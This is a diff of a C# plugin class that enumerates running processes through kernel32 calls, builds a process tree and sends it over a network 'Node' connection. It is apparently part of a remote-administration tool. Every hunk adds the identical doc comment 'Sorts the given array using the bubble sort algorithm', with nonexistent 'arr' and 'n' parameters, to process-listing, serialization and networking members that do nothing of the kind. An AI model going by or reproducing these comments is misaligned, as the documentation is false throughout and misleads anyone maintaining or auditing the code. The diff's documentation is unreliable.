@@ -18,6 +18,11 @@ namespace Plugin
     public class Main
     {
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
 
@@ -37,10 +42,20 @@ namespace Plugin
             public string szExeFile;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("kernel32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         private static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("kernel32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         private static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);
@@ -90,6 +105,11 @@ namespace Plugin
                 FileDescription = GetFileDescription(filePath);
             }
 
+            /// <summary>
+            /// Sorts the given array using the bubble sort algorithm.
+            /// </summary>
+            /// <param name="arr">The array to be sorted.</param>
+            /// <param name="n">The number of elements in the array.</param>
             private  string GetFileDescription(string filePath)
             {
                 if (string.IsNullOrEmpty(filePath))
@@ -112,6 +132,12 @@ namespace Plugin
                 }
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task<Dictionary<int, string>> GetAllProcessFilePathsAsync()
         {
             return await Task.Run(() =>
@@ -160,7 +186,11 @@ namespace Plugin
             });
         }
 
-
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private Dictionary<int, string> GetAllProcessFilePaths()
         {
             var processFilePaths = new Dictionary<int, string>();
@@ -209,6 +239,11 @@ namespace Plugin
             return processFilePaths;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private  string ExtractFilePathFromCommandLine(string commandLine)
         {
             // Extract the file path from the command line using custom logic
@@ -235,6 +270,11 @@ namespace Plugin
             return filePath;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task<Dictionary<int, ProcessNode>> BuildProcessTree(Process[] processes, Dictionary<int, string> processFilePaths)
         {
             var processMap = new Dictionary<int, ProcessNode>();
@@ -260,6 +300,12 @@ namespace Plugin
 
             return processMap;
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task<int> GetParentProcessIdAsync(Process process)
         {
             return await Task.Run(() =>
@@ -292,6 +338,11 @@ namespace Plugin
             });
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private int GetParentProcessId(Process process)
         {
             IntPtr snapshotHandle = CreateToolhelp32Snapshot(2 /* TH32CS_SNAPPROCESS */, 0);
@@ -321,6 +372,11 @@ namespace Plugin
             return -1; // Default value if parent process ID is not found
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private  List<ProcessNode> GetRootProcesses(Dictionary<int, ProcessNode> processMap)
         {
             var rootProcesses = new List<ProcessNode>();
@@ -336,6 +392,11 @@ namespace Plugin
             return rootProcesses;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private  byte[] SerializeProcessList(List<ProcessNode> processList)
         {
             byte[] done;
@@ -356,6 +417,11 @@ namespace Plugin
             return done;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void SerializeProcessNode(ProcessNode node, BinaryWriter writer)
         {
             writer.Write(node.PID);
@@ -369,6 +435,12 @@ namespace Plugin
                 SerializeProcessNode(child, writer);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void disposeAllProcess(Process[] processes) 
         {
             foreach (Process i in processes) 
@@ -379,6 +451,11 @@ namespace Plugin
 
         private bool paused = false;
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task RecvThread(Node node) 
         {
             while (node.Connected())
@@ -420,6 +497,12 @@ namespace Plugin
                 }
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task Run(Node node)
         {
             await node.SendAsync(new byte[] { 3 });//indicate that it has connected
